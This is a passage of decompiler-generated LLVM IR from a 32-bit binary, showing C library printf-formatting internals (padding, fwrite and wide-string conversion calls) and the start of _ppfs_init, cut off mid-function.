dec_label_pc_804e672:                             ; preds = %dec_label_pc_804e658, %dec_label_pc_804e4ef, %dec_label_pc_804e666
  %v1_804e672 = phi i32 [ 0, %dec_label_pc_804e658 ], [ %v2_804e4e7, %dec_label_pc_804e4ef ], [ %v1_804e672.pre, %dec_label_pc_804e666 ]
  %v0_804e672 = phi i32 [ %v0_804e67236, %dec_label_pc_804e658 ], [ %v1_804e473, %dec_label_pc_804e4ef ], [ %v0_804e672.pre, %dec_label_pc_804e666 ]
  %v2_804e672 = add i32 %v0_804e672, %v1_804e672
  store i32 %v2_804e672, i32* @edx, align 4
  %v0_804e675 = load i32, i32* @ebp, align 4
  %v9_804e675 = icmp eq i32 %v0_804e675, 11
  br i1 %v9_804e675, label %dec_label_pc_804e686, label %dec_label_pc_804e67a

dec_label_pc_804e67a:                             ; preds = %dec_label_pc_804e672
  %v1_804e67c = add i32 %v0_804e675, -5
  %v6_804e67c = sub i32 4, %v0_804e675
  %v7_804e67c = and i32 %v6_804e67c, %v0_804e675
  %v8_804e67c = icmp slt i32 %v7_804e67c, 0
  %v9_804e67c = icmp eq i32 %v1_804e67c, 0
  %v10_804e67c = icmp slt i32 %v1_804e67c, 0
  %v3_804e67f = icmp eq i1 %v10_804e67c, %v8_804e67c
  %v4_804e67f = icmp eq i1 %v9_804e67c, false
  %v5_804e67f = and i1 %v4_804e67f, %v3_804e67f
  %v6_804e67f = zext i1 %v5_804e67f to i32
  store i32 %v6_804e67f, i32* %eax.global-to-local, align 4
  %v2_804e682 = add i32 %v2_804e672, 1
  %v3_804e682 = add i32 %v2_804e682, %v6_804e67f
  store i32 %v3_804e682, i32* @edx, align 4
  br label %dec_label_pc_804e686

dec_label_pc_804e686:                             ; preds = %dec_label_pc_804e672, %dec_label_pc_804e67a
  %v0_804e686 = load i32, i32* @esp, align 4
  %v1_804e686 = add i32 %v0_804e686, 24
  %v2_804e686 = inttoptr i32 %v1_804e686 to i32*
  %v3_804e686 = load i32, i32* %v2_804e686, align 4
  store i32 %v3_804e686, i32* %eax.global-to-local, align 4
  %v1_804e68a = add i32 %v0_804e686, 8
  %v2_804e68a = inttoptr i32 %v1_804e68a to i32*
  store i32 0, i32* %v2_804e68a, align 4
  %v0_804e692 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e692 = load i32, i32* @edx, align 4
  %v2_804e692 = sub i32 %v0_804e692, %v1_804e692
  %v7_804e692 = icmp ult i32 %v0_804e692, %v1_804e692
  %v12_804e692 = icmp eq i32 %v2_804e692, 0
  %v2_804e694 = or i1 %v7_804e692, %v12_804e692
  br i1 %v2_804e694, label %dec_label_pc_804e69c, label %dec_label_pc_804e696

dec_label_pc_804e696:                             ; preds = %dec_label_pc_804e686
  store i32 %v2_804e692, i32* %eax.global-to-local, align 4
  %v1_804e698 = load i32, i32* @esp, align 4
  %v2_804e698 = add i32 %v1_804e698, 8
  %v3_804e698 = inttoptr i32 %v2_804e698 to i32*
  store i32 %v2_804e692, i32* %v3_804e698, align 4
  %v0_804e6a0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e69c

dec_label_pc_804e69c:                             ; preds = %dec_label_pc_804e686, %dec_label_pc_804e696
  %v0_804e6a0 = phi i32 [ %v1_804e692, %dec_label_pc_804e686 ], [ %v0_804e6a0.pre, %dec_label_pc_804e696 ]
  %v0_804e69c = load i32, i32* @esp, align 4
  %v1_804e69c = add i32 %v0_804e69c, 8
  %v2_804e69c = inttoptr i32 %v1_804e69c to i32*
  %v3_804e69c = load i32, i32* %v2_804e69c, align 4
  store i32 %v3_804e69c, i32* @ecx, align 4
  %v2_804e6a0 = add i32 %v3_804e69c, %v0_804e6a0
  store i32 %v2_804e6a0, i32* %eax.global-to-local, align 4
  %v1_804e6a3 = inttoptr i32 %v0_804e69c to i32*
  %v2_804e6a3 = load i32, i32* %v1_804e6a3, align 4
  %v4_804e6a3 = add i32 %v2_804e6a3, %v2_804e6a0
  store i32 %v4_804e6a3, i32* %v1_804e6a3, align 4
  %v0_804e6a6 = load i32, i32* @esp, align 4
  %v1_804e6a6 = add i32 %v0_804e6a6, 7
  %v2_804e6a6 = inttoptr i32 %v1_804e6a6 to i8*
  %v3_804e6a6 = load i8, i8* %v2_804e6a6, align 1
  %v9_804e6a6 = icmp eq i8 %v3_804e6a6, 48
  %v1_804e6ab = icmp eq i1 %v9_804e6a6, false
  br i1 %v1_804e6ab, label %dec_label_pc_804e6b7, label %dec_label_pc_804e6ad

dec_label_pc_804e6ad:                             ; preds = %dec_label_pc_804e69c
  %v0_804e6ad = load i32, i32* @ebx, align 4
  %v1_804e6ad = load i32, i32* @ecx, align 4
  %v2_804e6ad = add i32 %v1_804e6ad, %v0_804e6ad
  store i32 %v2_804e6ad, i32* @ebx, align 4
  %v1_804e6af = add i32 %v0_804e6a6, 8
  %v2_804e6af = inttoptr i32 %v1_804e6af to i32*
  store i32 0, i32* %v2_804e6af, align 4
  %v0_804e6b7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6b7

dec_label_pc_804e6b7:                             ; preds = %dec_label_pc_804e69c, %dec_label_pc_804e6ad
  %v0_804e6be = phi i32 [ %v0_804e6a6, %dec_label_pc_804e69c ], [ %v0_804e6b7.pre, %dec_label_pc_804e6ad ]
  %v1_804e6b7 = add i32 %v0_804e6be, 32
  %v2_804e6b7 = inttoptr i32 %v1_804e6b7 to i8*
  %v3_804e6b7 = load i8, i8* %v2_804e6b7, align 1
  %v4_804e6b7 = and i8 %v3_804e6b7, 8
  %v5_804e6b7 = icmp eq i8 %v4_804e6b7, 0
  %v1_804e6bc = icmp eq i1 %v5_804e6b7, false
  br i1 %v1_804e6bc, label %dec_label_pc_804e6e5, label %dec_label_pc_804e6be

dec_label_pc_804e6be:                             ; preds = %dec_label_pc_804e6b7
  %v1_804e6be = add i32 %v0_804e6be, 8
  %v2_804e6be = inttoptr i32 %v1_804e6be to i32*
  %v3_804e6be = load i32, i32* %v2_804e6be, align 4
  store i32 %v3_804e6be, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e6c7 = add i32 %v0_804e6be, 368
  %v2_804e6c7 = inttoptr i32 %v1_804e6c7 to i32*
  %v3_804e6c7 = load i32, i32* %v2_804e6c7, align 4
  store i32 %v3_804e6c7, i32* @eax, align 4
  %v0_804e6ce = call i32 @_charpad()
  store i32 %v0_804e6ce, i32* %eax.global-to-local, align 4
  %v1_804e6d3 = load i32, i32* @esp, align 4
  %v2_804e6d3 = add i32 %v1_804e6d3, 8
  %v3_804e6d3 = inttoptr i32 %v2_804e6d3 to i32*
  %v4_804e6d3 = load i32, i32* %v3_804e6d3, align 4
  %v15_804e6d3 = icmp eq i32 %v0_804e6ce, %v4_804e6d3
  %v1_804e6d7 = icmp eq i1 %v15_804e6d3, false
  br i1 %v1_804e6d7, label %dec_label_pc_804e7d3, label %dec_label_pc_804e6dd

dec_label_pc_804e6dd:                             ; preds = %dec_label_pc_804e6be
  store i32 0, i32* %v3_804e6d3, align 4
  %v1_804e6e5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6e5

dec_label_pc_804e6e5:                             ; preds = %dec_label_pc_804e6b7, %dec_label_pc_804e6dd
  %v1_804e6e5 = phi i32 [ %v0_804e6be, %dec_label_pc_804e6b7 ], [ %v1_804e6e5.pre, %dec_label_pc_804e6dd ]
  %v0_804e6e5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e6e5 = add i32 %v1_804e6e5, -4
  %v3_804e6e5 = inttoptr i32 %v2_804e6e5 to i32*
  store i32 %v0_804e6e5, i32* %v3_804e6e5, align 4
  %v0_804e6e6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e6e6 = add i32 %v1_804e6e5, -8
  %v3_804e6e6 = inttoptr i32 %v2_804e6e6 to i32*
  store i32 %v0_804e6e6, i32* %v3_804e6e6, align 4
  %v1_804e6e7 = add i32 %v1_804e6e5, 368
  %v2_804e6e7 = inttoptr i32 %v1_804e6e7 to i32*
  %v3_804e6e7 = load i32, i32* %v2_804e6e7, align 4
  %v5_804e6e7 = add i32 %v1_804e6e5, -12
  %v6_804e6e7 = inttoptr i32 %v5_804e6e7 to i32*
  store i32 %v3_804e6e7, i32* %v6_804e6e7, align 4
  %v0_804e6ee = load i32, i32* @ebp, align 4
  %v1_804e6ee = add i32 %v0_804e6ee, ptrtoint (i32* @global_var_8056dc5.204 to i32)
  store i32 %v1_804e6ee, i32* %eax.global-to-local, align 4
  %v2_804e6f4 = add i32 %v1_804e6e5, -16
  %v3_804e6f4 = inttoptr i32 %v2_804e6f4 to i32*
  store i32 %v1_804e6ee, i32* %v3_804e6f4, align 4
  %v0_804e6f5 = load i32, i32* %stack_var_-364, align 4
  %v4_804e6f5 = inttoptr i32 %v0_804e6f5 to i8*
  %v5_804e6f5 = call i32 @__GI_fputs_unlocked(i8* %v4_804e6f5, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e6f5, i32* %eax.global-to-local, align 4
  %v0_804e6fa = load i32, i32* @esp, align 4
  %v1_804e6fa = add i32 %v0_804e6fa, 384
  %v2_804e6fa = inttoptr i32 %v1_804e6fa to i32*
  %v3_804e6fa = load i32, i32* %v2_804e6fa, align 4
  store i32 %v3_804e6fa, i32* @eax, align 4
  %v0_804e701 = load i32, i32* @ebx, align 4
  store i32 %v0_804e701, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804e708 = call i32 @_charpad()
  store i32 %v0_804e708, i32* %eax.global-to-local, align 4
  %v0_804e70d = load i32, i32* @esp, align 4
  %v1_804e70d = add i32 %v0_804e70d, 16
  %v1_804e710 = load i32, i32* @ebx, align 4
  %v12_804e710 = icmp eq i32 %v0_804e708, %v1_804e710
  %v1_804e712 = icmp eq i1 %v12_804e710, false
  br i1 %v1_804e712, label %dec_label_pc_804e7d3, label %dec_label_pc_804e718

dec_label_pc_804e718:                             ; preds = %dec_label_pc_804e6e5
  %v1_804e718 = add i32 %v0_804e70d, 356
  %v2_804e718 = inttoptr i32 %v1_804e718 to i32*
  %v3_804e718 = load i32, i32* %v2_804e718, align 4
  %v4_804e718 = icmp eq i32 %v3_804e718, 0
  %v1_804e720 = icmp eq i1 %v4_804e718, false
  br i1 %v1_804e720, label %dec_label_pc_804e744, label %dec_label_pc_804e722

dec_label_pc_804e722:                             ; preds = %dec_label_pc_804e718
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e724 = load i32, i32* @esi, align 4
  %v1_804e724 = icmp eq i32 %v0_804e724, 0
  br i1 %v1_804e724, label %dec_label_pc_804e73a.thread, label %dec_label_pc_804e73a

dec_label_pc_804e73a.thread:                      ; preds = %dec_label_pc_804e722
  br label %dec_label_pc_804e7a5

dec_label_pc_804e73a:                             ; preds = %dec_label_pc_804e722
  %v2_804e728 = add i32 %v0_804e70d, 12
  %v3_804e728 = inttoptr i32 %v2_804e728 to i32*
  store i32 0, i32* %v3_804e728, align 4
  %v1_804e729 = add i32 %v0_804e70d, 384
  %v2_804e729 = inttoptr i32 %v1_804e729 to i32*
  %v3_804e729 = load i32, i32* %v2_804e729, align 4
  %v5_804e729 = add i32 %v0_804e70d, 8
  %v6_804e729 = inttoptr i32 %v5_804e729 to i32*
  store i32 %v3_804e729, i32* %v6_804e729, align 4
  %v0_804e730 = load i32, i32* @esi, align 4
  %v2_804e730 = add i32 %v0_804e70d, 4
  %v3_804e730 = inttoptr i32 %v2_804e730 to i32*
  store i32 %v0_804e730, i32* %v3_804e730, align 4
  %v0_804e731 = load i32, i32* @edi, align 4
  %v3_804e731 = inttoptr i32 %v0_804e70d to i32*
  store i32 %v0_804e731, i32* %v3_804e731, align 4
  %v0_804e732 = load i32, i32* %stack_var_-364, align 4
  %v4_804e732 = call i32 @__stdio_fwrite(i32 %v0_804e732, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e732, i32* %eax.global-to-local, align 4
  %v0_804e737 = load i32, i32* @esp, align 4
  %v1_804e737 = add i32 %v0_804e737, 16
  %v1_804e73a.pre = load i32, i32* @esi, align 4
  %v12_804e73a = icmp eq i32 %v4_804e732, %v1_804e73a.pre
  %v1_804e73c = icmp eq i1 %v12_804e73a, false
  br i1 %v1_804e73c, label %dec_label_pc_804e7d3, label %dec_label_pc_804e7a5

dec_label_pc_804e744:                             ; preds = %dec_label_pc_804e718
  %v1_804e744 = add i32 %v0_804e70d, 348
  %v2_804e744 = inttoptr i32 %v1_804e744 to i32*
  store i32 0, i32* %v2_804e744, align 4
  %v0_804e7a17 = load i32, i32* @esi, align 4
  %v1_804e7a18 = icmp eq i32 %v0_804e7a17, 0
  %v1_804e7a315 = icmp eq i1 %v1_804e7a18, false
  br i1 %v1_804e7a315, label %dec_label_pc_804e751, label %dec_label_pc_804e744.dec_label_pc_804e7a5.loopexit_crit_edge

dec_label_pc_804e744.dec_label_pc_804e7a5.loopexit_crit_edge: ; preds = %dec_label_pc_804e744
  %v0_804e7a5.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e7a5

dec_label_pc_804e751:                             ; preds = %dec_label_pc_804e744, %dec_label_pc_804e79f
  %v0_804e751 = phi i32 [ %v2_804e79f, %dec_label_pc_804e79f ], [ %v0_804e7a17, %dec_label_pc_804e744 ]
  %tmp102 = icmp ult i32 %v0_804e751, 129
  br i1 %tmp102, label %dec_label_pc_804e760, label %dec_label_pc_804e75b

dec_label_pc_804e75b:                             ; preds = %dec_label_pc_804e751
  br label %dec_label_pc_804e760

dec_label_pc_804e760:                             ; preds = %dec_label_pc_804e751, %dec_label_pc_804e75b
  %storemerge103 = phi i32 [ 128, %dec_label_pc_804e75b ], [ %v0_804e751, %dec_label_pc_804e751 ]
  store i32 %storemerge103, i32* %edx.global-to-local, align 4
  %v0_804e760 = load i32, i32* @esp, align 4
  %v1_804e760 = add i32 %v0_804e760, 332
  %v2_804e767 = add i32 %v0_804e760, -4
  %v3_804e767 = inttoptr i32 %v2_804e767 to i32*
  store i32 %v1_804e760, i32* %v3_804e767, align 4
  %v0_804e768 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e768 = add i32 %v0_804e760, -8
  %v3_804e768 = inttoptr i32 %v2_804e768 to i32*
  store i32 %v0_804e768, i32* %v3_804e768, align 4
  %v1_804e769 = add i32 %v0_804e760, 340
  store i32 %v1_804e769, i32* %eax.global-to-local, align 4
  %v2_804e770 = add i32 %v0_804e760, -12
  %v3_804e770 = inttoptr i32 %v2_804e770 to i32*
  store i32 %v1_804e769, i32* %v3_804e770, align 4
  %v1_804e771 = add i32 %v0_804e760, 204
  store i32 %v1_804e771, i32* @edi, align 4
  %v2_804e778 = add i32 %v0_804e760, -16
  %v3_804e778 = inttoptr i32 %v2_804e778 to i32*
  store i32 %v1_804e771, i32* %v3_804e778, align 4
  %v0_804e779 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e779, i32* @ebx, align 4
  %v0_804e780 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e785 = icmp eq i32 %v0_804e779, 0
  br i1 %v1_804e785, label %dec_label_pc_804e79b, label %dec_label_pc_804e789

dec_label_pc_804e789:                             ; preds = %dec_label_pc_804e760
  %v0_804e789 = load i32, i32* @ebp, align 4
  %v2_804e789 = add i32 %v0_804e780, 12
  %v3_804e789 = inttoptr i32 %v2_804e789 to i32*
  store i32 %v0_804e789, i32* %v3_804e789, align 4
  %v1_804e78a = add i32 %v0_804e780, 384
  %v2_804e78a = inttoptr i32 %v1_804e78a to i32*
  %v3_804e78a = load i32, i32* %v2_804e78a, align 4
  %v5_804e78a = add i32 %v0_804e780, 8
  %v6_804e78a = inttoptr i32 %v5_804e78a to i32*
  store i32 %v3_804e78a, i32* %v6_804e78a, align 4
  %v2_804e791 = add i32 %v0_804e780, 4
  %v3_804e791 = inttoptr i32 %v2_804e791 to i32*
  store i32 %v0_804e779, i32* %v3_804e791, align 4
  %v0_804e792 = load i32, i32* @edi, align 4
  %v3_804e792 = inttoptr i32 %v0_804e780 to i32*
  store i32 %v0_804e792, i32* %v3_804e792, align 4
  %v0_804e793 = load i32, i32* %stack_var_-364, align 4
  %v4_804e793 = call i32 @__stdio_fwrite(i32 %v0_804e793, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e793, i32* %eax.global-to-local, align 4
  %v0_804e798 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e79b

dec_label_pc_804e79b:                             ; preds = %dec_label_pc_804e760, %dec_label_pc_804e789
  %v0_804e7d349.in = phi i32 [ %v0_804e780, %dec_label_pc_804e760 ], [ %v0_804e798, %dec_label_pc_804e789 ]
  %v1_804e79f = phi i32 [ 0, %dec_label_pc_804e760 ], [ %v4_804e793, %dec_label_pc_804e789 ]
  %v0_804e7d349 = add i32 %v0_804e7d349.in, 16
  %v12_804e79b = icmp eq i32 %v1_804e79f, %v0_804e779
  %v1_804e79d = icmp eq i1 %v12_804e79b, false
  br i1 %v1_804e79d, label %dec_label_pc_804e7d3, label %dec_label_pc_804e79f

dec_label_pc_804e79f:                             ; preds = %dec_label_pc_804e79b
  %v0_804e79f = load i32, i32* @esi, align 4
  %v2_804e79f = sub i32 %v0_804e79f, %v1_804e79f
  %v12_804e79f = icmp eq i32 %v2_804e79f, 0
  store i32 %v2_804e79f, i32* @esi, align 4
  %v1_804e7a3 = icmp eq i1 %v12_804e79f, false
  br i1 %v1_804e7a3, label %dec_label_pc_804e751, label %dec_label_pc_804e7a5

dec_label_pc_804e7a5:                             ; preds = %dec_label_pc_804e79f, %dec_label_pc_804e73a.thread, %dec_label_pc_804e744.dec_label_pc_804e7a5.loopexit_crit_edge, %dec_label_pc_804e73a
  %v0_804e7a5 = phi i32 [ %v1_804e737, %dec_label_pc_804e73a ], [ %v0_804e7a5.pre.pre, %dec_label_pc_804e744.dec_label_pc_804e7a5.loopexit_crit_edge ], [ %v1_804e70d, %dec_label_pc_804e73a.thread ], [ %v0_804e7d349, %dec_label_pc_804e79f ]
  %v1_804e7a5 = add i32 %v0_804e7a5, 8
  %v2_804e7a5 = inttoptr i32 %v1_804e7a5 to i32*
  %v3_804e7a5 = load i32, i32* %v2_804e7a5, align 4
  store i32 %v3_804e7a5, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e7ae = add i32 %v0_804e7a5, 368
  %v2_804e7ae = inttoptr i32 %v1_804e7ae to i32*
  %v3_804e7ae = load i32, i32* %v2_804e7ae, align 4
  store i32 %v3_804e7ae, i32* @eax, align 4
  %v0_804e7b5 = call i32 @_charpad()
  store i32 %v0_804e7b5, i32* %eax.global-to-local, align 4
  %v1_804e7ba = load i32, i32* @esp, align 4
  %v2_804e7ba = add i32 %v1_804e7ba, 8
  %v3_804e7ba = inttoptr i32 %v2_804e7ba to i32*
  %v4_804e7ba = load i32, i32* %v3_804e7ba, align 4
  %v15_804e7ba = icmp eq i32 %v0_804e7b5, %v4_804e7ba
  %v1_804e7be = icmp eq i1 %v15_804e7ba, false
  br i1 %v1_804e7be, label %dec_label_pc_804e7d3, label %dec_label_pc_804e7c0

dec_label_pc_804e7c0:                             ; preds = %dec_label_pc_804e7a5, %dec_label_pc_804e53a, %dec_label_pc_804e368
  %v0_804e7c0 = phi i32 [ %v1_804e7ba, %dec_label_pc_804e7a5 ], [ %v0_804e7c0.pre, %dec_label_pc_804e53a ], [ %v1_804e386, %dec_label_pc_804e368 ]
  %v1_804e7c0 = add i32 %v0_804e7c0, 16
  %v2_804e7c0 = inttoptr i32 %v1_804e7c0 to i32*
  %v3_804e7c0 = load i32, i32* %v2_804e7c0, align 4
  store i32 %v3_804e7c0, i32* @ebx, align 4
  store i32 %v3_804e7c0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e2c0.backedge

dec_label_pc_804e7cb:                             ; preds = %dec_label_pc_804e2fe
  %v1_804e7cb = add i32 %v0_804e7cb, 2
  store i32 %v1_804e7cb, i32* @ebx, align 4
  br label %dec_label_pc_804e2c0.backedge

dec_label_pc_804e7d3:                             ; preds = %dec_label_pc_804e2ea, %dec_label_pc_804e7a5, %dec_label_pc_804e73a, %dec_label_pc_804e6e5, %dec_label_pc_804e6be, %dec_label_pc_804e62e, %dec_label_pc_804e5a9, %dec_label_pc_804e57d, %dec_label_pc_804e511, %dec_label_pc_804e79b
  %v0_804e7d3 = phi i32 [ %v0_804e7d349, %dec_label_pc_804e79b ], [ %v0_804e7d3.pre.pre, %dec_label_pc_804e2ea ], [ %v1_804e7ba, %dec_label_pc_804e7a5 ], [ %v1_804e737, %dec_label_pc_804e73a ], [ %v1_804e70d, %dec_label_pc_804e6e5 ], [ %v1_804e6d3, %dec_label_pc_804e6be ], [ %v0_804e360.lcssa, %dec_label_pc_804e62e ], [ %v1_804e5c1, %dec_label_pc_804e5a9 ], [ %v1_804e594, %dec_label_pc_804e57d ], [ %v1_804e52f, %dec_label_pc_804e511 ]
  %v1_804e7d3 = inttoptr i32 %v0_804e7d3 to i32*
  store i32 -1, i32* %v1_804e7d3, align 4
  br label %dec_label_pc_804e7da

dec_label_pc_804e7da:                             ; preds = %dec_label_pc_804e2f5, %dec_label_pc_804e263, %dec_label_pc_804e282, %dec_label_pc_804e7d3
  %v0_804e7da = load i32, i32* @esp, align 4
  %v1_804e7da = inttoptr i32 %v0_804e7da to i32*
  %v2_804e7da = load i32, i32* %v1_804e7da, align 4
  store i32 %v2_804e7da, i32* %eax.global-to-local, align 4
  %v1_804e7dd = add i32 %v0_804e7da, 348
  %v1_804e7e3 = inttoptr i32 %v1_804e7dd to i32*
  %v2_804e7e3 = load i32, i32* %v1_804e7e3, align 4
  store i32 %v2_804e7e3, i32* @ebx, align 4
  ret i32 %v2_804e7da

; uselistorder directives
  uselistorder i32 %v1_804e7cb, { 1, 0 }
  uselistorder i32 %v3_804e7c0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e7a5, { 1, 0 }
  uselistorder i32 %v2_804e79f, { 1, 2, 0 }
  uselistorder i32 %v0_804e7d349, { 1, 0 }
  uselistorder i32 %v1_804e79f, { 1, 0 }
  uselistorder i32 %v0_804e780, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e70d, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e6e5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e6be, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e692, { 1, 0, 2 }
  uselistorder i32 %v6_804e67f, { 1, 0 }
  uselistorder i32 %v1_804e67c, { 1, 0 }
  uselistorder i32 %v0_804e675, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e5ff, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e60f, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e570, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e556, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e4ef, { 1, 0, 2 }
  uselistorder i32 %v1_804e473, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e4c6, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e44f, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e408, { 1, 0 }
  uselistorder i32 %v1_804e415, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e360, { 3, 12, 10, 5, 4, 7, 6, 8, 13, 0, 1, 2, 11, 9, 14, 15 }
  uselistorder i32 %v0_804e360.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e35c, { 1, 0 }
  uselistorder i32 %v1_804e35c.pre, { 1, 0 }
  uselistorder i32 %v1_804e35b, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e358, { 1, 0 }
  uselistorder i32 %v2_804e35c80, { 1, 0 }
  uselistorder i32 %v3_804e342, { 1, 0 }
  uselistorder i32 %v1_804e2fe, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e2ca, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e2ce, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e2b8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 4, 7, 0, 6, 5, 3, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e7da, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e7d3, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e7a5, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e79b, { 1, 0 }
  uselistorder label %dec_label_pc_804e760, { 1, 0 }
  uselistorder label %dec_label_pc_804e751, { 1, 0 }
  uselistorder label %dec_label_pc_804e6e5, { 1, 0 }
  uselistorder label %dec_label_pc_804e6b7, { 1, 0 }
  uselistorder label %dec_label_pc_804e69c, { 1, 0 }
  uselistorder label %dec_label_pc_804e686, { 1, 0 }
  uselistorder label %dec_label_pc_804e672, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e666, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e5ff, { 1, 0 }
  uselistorder label %dec_label_pc_804e5f2, { 1, 0 }
  uselistorder label %dec_label_pc_804e57d, { 1, 0 }
  uselistorder label %dec_label_pc_804e511, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c6, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b7, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e47d, { 1, 0 }
  uselistorder label %dec_label_pc_804e464, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e415, { 1, 0 }
  uselistorder label %dec_label_pc_804e3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e8, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e3c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e351, { 1, 0 }
  uselistorder label %dec_label_pc_804e349, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f5, { 1, 0 }
  uselistorder label %dec_label_pc_804e2ea, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c0.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e7e8 = load i32, i32* @esi, align 4
  %v0_804e7e9 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7e9, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e7fd = bitcast i32* %arg1 to i8*
  %v4_804e7fd = call i32 @__GI_memset(i8* %v3_804e7fd, i32 0, i32 188)
  store i32 %v4_804e7fd, i32* %eax.global-to-local, align 4
  %v0_804e802 = load i32, i32* @ebx, align 4
  %v1_804e802 = add i32 %v0_804e802, 24
  %v2_804e802 = inttoptr i32 %v1_804e802 to i32*
  %v3_804e802 = load i32, i32* %v2_804e802, align 4
  %v4_804e802 = add i32 %v3_804e802, -1
  store i32 %v4_804e802, i32* %v2_804e802, align 4
  %v0_804e805 = load i32, i32* @esi, align 4
  %v1_804e805 = load i32, i32* @ebx, align 4
  %v2_804e805 = inttoptr i32 %v1_804e805 to i32*
  store i32 %v0_804e805, i32* %v2_804e805, align 4
  %v0_804e807 = load i32, i32* @ebx, align 4
  %v1_804e807 = add i32 %v0_804e807, 40
  store i32 %v1_804e807, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e812

dec_label_pc_804e812:                             ; preds = %dec_label_pc_804e812, %entry
  %v0_804e812 = phi i32 [ %v1_804e818, %dec_label_pc_804e812 ], [ %v1_804e807, %entry ]
  %v1_804e812 = inttoptr i32 %v0_804e812 to i32*
  store i32 8, i32* %v1_804e812, align 4
  %v0_804e818 = load i32, i32* %eax.global-to-local, align 4
